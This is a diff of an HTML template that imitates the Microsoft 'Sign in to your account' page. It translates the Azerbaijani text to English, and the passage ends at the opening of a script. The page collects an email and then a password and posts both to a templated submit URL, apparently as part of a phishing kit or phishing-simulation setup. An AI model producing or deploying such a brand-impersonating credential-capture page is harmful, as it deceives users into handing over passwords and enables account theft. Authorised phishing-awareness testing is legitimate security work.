@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="az">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Daxil olun hesabınıza</title>
+<title>Sign in to your account</title>
 <style>
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -43,28 +43,26 @@
     <div class="logo"><div class="sq"><i></i><i></i><i></i><i></i></div><span>Microsoft</span></div>
 
     <form action="{{.SubmitURL}}" method="post" autocomplete="off" id="f">
-      <!-- Addım 1: email -->
       <div id="step1">
-        <h1>Daxil olun</h1>
-        <input name="username" id="u" type="email" placeholder="Email, telefon və ya Skype" required autofocus>
+        <h1>Sign in</h1>
+        <input name="username" id="u" type="email" placeholder="Email, phone, or Skype" required autofocus>
         <p class="info">
-          <a href="#">Hesabınıza daxil ola bilmirsiniz?</a><br>
-          Hesabınız yoxdur? <a href="#">İndi yaradın</a>
+          <a href="#">Can't access your account?</a><br>
+          No account? <a href="#">Create one now</a>
         </p>
-        <div class="row"><button class="btn" type="button" id="next">Sonrakı</button></div>
+        <div class="row"><button class="btn" type="button" id="next">Next</button></div>
       </div>
 
-      <!-- Addım 2: parol -->
       <div id="step2" class="hidden">
         <div class="back"><span class="arr" id="arr">←</span><span id="uecho"></span></div>
-        <h1>Parol daxil edin</h1>
-        <input name="password" id="p" type="password" placeholder="Parol">
-        <p class="info"><a href="#">Parolu unutmusunuz?</a></p>
-        <div class="row"><button class="btn" type="submit">Daxil ol</button></div>
+        <h1>Enter password</h1>
+        <input name="password" id="p" type="password" placeholder="Password">
+        <p class="info"><a href="#">Forgot your password?</a></p>
+        <div class="row"><button class="btn" type="submit">Sign in</button></div>
       </div>
     </form>
   </div>
-  <div class="foot"><a href="#">İstifadə şərtləri</a><a href="#">Məxfilik və kukilər</a><a href="#">···</a></div>
+  <div class="foot"><a href="#">Terms of use</a><a href="#">Privacy and cookies</a><a href="#">···</a></div>
 
   <script>
     var s1=document.getElementById('step1'),s2=document.getElementById('step2'),
